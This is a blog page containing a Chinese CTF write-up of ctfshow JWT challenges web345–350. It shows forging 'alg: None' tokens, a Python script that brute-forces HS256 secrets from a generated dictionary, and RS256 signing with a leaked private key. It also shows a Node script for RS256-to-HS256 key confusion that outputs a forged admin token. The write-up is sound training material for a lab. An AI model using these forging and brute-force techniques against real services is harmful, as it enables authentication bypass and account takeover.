@@ -1,0 +1,234 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Web入门_jwt | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="web345-350">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web入门_jwt">
+<meta property="og:url" content="https://4reexile.github.io/article/ctfshow-webbasic-jwt/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="web345-350">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-12-02T13:13:47.000Z">
+<meta property="article:modified_time" content="2024-12-02T13:20:03.094Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="爆破">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="jwt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/ctfshow-webbasic-jwt/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Web入门_jwt',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-02 21:20:03'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Web入门_jwt</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-02T13:13:47.000Z" title="Created 2024-12-02 21:13:47">2024-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-02T13:20:03.094Z" title="Updated 2024-12-02 21:20:03">2024-12-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctfshow%E9%9D%B6%E5%9C%BA/">ctfshow靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.2k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>Web入门_jwt</h1>
+<hr>
+<h2 id="web345"><a class="header-anchor" href="#web345">¶</a>web345</h2>
+<ul>
+<li>描述: jwt开始啦</li>
+</ul>
+<p>base解码cookie</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;None&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;jwt&quot;</span>&#125;?[&#123;<span class="string">&quot;iss&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;iat&quot;</span>:<span class="number">1729655829</span>,<span class="string">&quot;exp&quot;</span>:<span class="number">1729663029</span>,<span class="string">&quot;nbf&quot;</span>:<span class="number">1729655829</span>,<span class="string">&quot;sub&quot;</span>:<span class="string">&quot;user&quot;</span>,<span class="string">&quot;jti&quot;</span>:<span class="string">&quot;a665ee692b35c52bf4da124b7e06126b&quot;</span>&#125;]</span><br><span class="line"><span class="comment">// 稍作修改</span></span><br><span class="line">&#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;None&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;jwt&quot;</span>&#125;?[&#123;<span class="string">&quot;iss&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;iat&quot;</span>:<span class="number">1729655829</span>,<span class="string">&quot;exp&quot;</span>:<span class="number">1729663029</span>,<span class="string">&quot;nbf&quot;</span>:<span class="number">1729655829</span>,<span class="string">&quot;sub&quot;</span>:<span class="string">&quot;user&quot;</span>,<span class="string">&quot;admin&quot;</span>:<span class="string">&quot;a665ee692b35c52bf4da124b7e06126b&quot;</span>&#125;]</span><br><span class="line"><span class="comment">// eyJhbGciOiJOb25lIiwidHlwIjoiand0In0/W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3Mjk2NTU4MjksImV4cCI6MTcyOTY2MzAyOSwibmJmIjoxNzI5NjU1ODI5LCJzdWIiOiJ1c2VyIiwiYWRtaW4iOiJhNjY1ZWU2OTJiMzVjNTJiZjRkYTEyNGI3ZTA2MTI2YiJ9XQ==</span></span><br></pre></td></tr></table></figure>
+<p>手动写进cookie即可, 这边是直接在控制台的<code>Applocation</code>里面写的, hackerbar设置cookie也是正常的; 听说抓包的话还需要修改header才可以, 不是很懂</p>
+<h2 id="web346"><a class="header-anchor" href="#web346">¶</a>web346</h2>
+<ul>
+<li>描述: 同上</li>
+</ul>
+<p>解密网站: <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<p>jwt结构可以从这个网站里面看到: HMACSHA256( base64(头) + <code>.</code> + base(数据), 密钥); 这个网站可以直接在右侧修改字符串, 左侧会同时改变, 修改结果如下:</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241023123017.png" alt="image.png"></p>
+<p>你问为什么密钥是这个, 我只能说猜的</p>
+<h2 id="web347"><a class="header-anchor" href="#web347">¶</a>web347</h2>
+<ul>
+<li>描述: jwt开始啦,弱口令</li>
+</ul>
+<p>步骤完全同上, 密码都是一样的</p>
+<p>可能本来的用意是写py脚本跑弱密码字典, 谁知道只是123456呢</p>
+<h2 id="web348"><a class="header-anchor" href="#web348">¶</a>web348</h2>
+<ul>
+<li>描述: jwt开始啦,爆破</li>
+</ul>
+<p>顾名思义, 应该是爆破密钥, 此时再用解密网站一个一个尝试在进度过于缓慢了, 这里我们用万能的py写个脚本, 但是你肯定得用到这个<a target="_blank" rel="noopener" href="https://github.com/LandGrey/pydictor">pydictor-字典生成器</a></p>
+<blockquote>
+<p>我寻思上一题没说纯数字, 这一题也没说纯字母啊</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python .\pydictor.py -base L --len 1 4 -o key.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241023194013.png" alt="image.png"></p>
+<p>将这个生成的字典放在下面这个代码的通一个文件夹下, 然后运行这个从官方那里扒拉下来的脚本:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runblasting</span>(<span class="params">path, jwt_str ,alg</span>):</span><br><span class="line">    <span class="keyword">if</span> alg == <span class="string">&quot;none&quot;</span>:</span><br><span class="line">        alg = <span class="string">&quot;HS256&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key = line.strip()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;use &#x27;</span> + key)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key, algorithms=alg)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;find key&#x27;</span> + key)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;found key&#x27;</span> + key)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;key no found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">    runblasting(<span class="string">&#x27;key.txt&#x27;</span>, <span class="string">&#x27;cookie的auth参数&#x27;</span>, <span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>最后应该能爆出来密码为aaab, 回到之前那个网站改密钥即可</p>
+<h2 id="web349"><a class="header-anchor" href="#web349">¶</a>web349</h2>
+<ul>
+<li>描述: 给了一个app.js文件</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>虽然用的是私钥, 但是该文件是可以下载下来的, 所以我们&quot;可能&quot;需要一个题目同款环境, 然后在源码中直接改为admin生成一个jwt即可</p>
+<p>使用py脚本进行操作, 与私钥文件放在同目录下即可, 改cookie我就不写了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;private.key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">payload=&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="string">&#x27;RS256&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>下面是失败案例, 我不想配环境啊</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx express-generator</span><br><span class="line"><span class="comment"># 似乎有npm就有, 反正你先试试有没有npx, 我是Ubuntu</span></span><br><span class="line"><span class="comment"># 用于快速生成一个基础的 Node.js Web 应用框架</span></span><br></pre></td></tr></table></figure>
+<p>将上面这个<code>app.js</code>的内容复制并替换进你生成的框架的<code>/routes/index.php</code>, 然后改一下user</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241023203458.png" alt="image.png"></p>
+<p>下载私钥, 访问<code>/private.key</code>即可下载, 将其放在你生成的框架目录的public文件夹下</p>
+<p>然后就是安装依赖的时间了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm start</span><br><span class="line"><span class="comment"># 测试, 这里没报错了再进网页看是否报错, 我到这里就没有报错了</span></span><br><span class="line">npm install http-errors</span><br><span class="line">npm install jsonwebtoken</span><br><span class="line"><span class="comment"># 直接输入jwt似乎不行</span></span><br></pre></td></tr></table></figure>
+<p>进入网页出现<code>fs is not defined</code>或者其他的, 是因为没有声明; 在<code>index.js</code>前面加上声明即可:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>诶您才怎么着, 这些干完了给我整出来一个<code>secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code>, 白瞎了</p>
+<h2 id="web350"><a class="header-anchor" href="#web350">¶</a>web350</h2>
+<ul>
+<li>描述: 给了源码包</li>
+</ul>
+<p>在给的源码中将公私钥都放进了<code>/route</code>目录下, 但是依然可以通过访问<code>/public.key</code>来下载公钥</p>
+<blockquote>
+<p>我这里用python整不出来, 然后配置环境也配不出来, 委屈一下直接运行吧</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// yu22x师傅  </span></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;public.key&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);  </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure>
+<p>然后运行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node jwt.js</span><br><span class="line"><span class="comment"># eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3Mjk3NTYzMzd9.ybFtdAxkeMIln0uDWfoIfwJa-fsP0tAwFmDlX_5pDcE</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024155259.png" alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024155437.png" alt="image.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/ctfshow-webbasic-jwt/">https://4reexile.github.io/article/ctfshow-webbasic-jwt/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%88%86%E7%A0%B4/">爆破</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/jwt/">jwt</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/ctfshow-webbasic-ssrf/" title="Web入门_SSRF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Web入门_SSRF</div></div></a></div><div class="next-post pull-right"><a href="/article/WinterMute-1/" title="WinterMute-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">WinterMute-1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/Broken-Gallery/" title="Broken-Gallery"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-31</div><div class="title">Broken-Gallery</div></div></a></div><div><a href="/article/DerpNStink-1/" title="DerpNStink-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="title">DerpNStink-1</div></div></a></div><div><a href="/article/EVM-1/" title="EVM-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-06</div><div class="title">EVM-1</div></div></a></div><div><a href="/article/GoldenEye-1/" title="GoldenEye-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-05</div><div class="title">GoldenEye-1</div></div></a></div><div><a href="/article/grey-hack/" title="GreyHack"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-25</div><div class="title">GreyHack</div></div></a></div><div><a href="/article/HackLAB-Vulnix/" title="HackLAB-Vulnix"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-08</div><div class="title">HackLAB-Vulnix</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Web入门_jwt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web345"><span class="toc-number">1.1.</span> <span class="toc-text">web345</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web346"><span class="toc-number">1.2.</span> <span class="toc-text">web346</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web347"><span class="toc-number">1.3.</span> <span class="toc-text">web347</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web348"><span class="toc-number">1.4.</span> <span class="toc-text">web348</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web349"><span class="toc-number">1.5.</span> <span class="toc-text">web349</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web350"><span class="toc-number">1.6.</span> <span class="toc-text">web350</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" 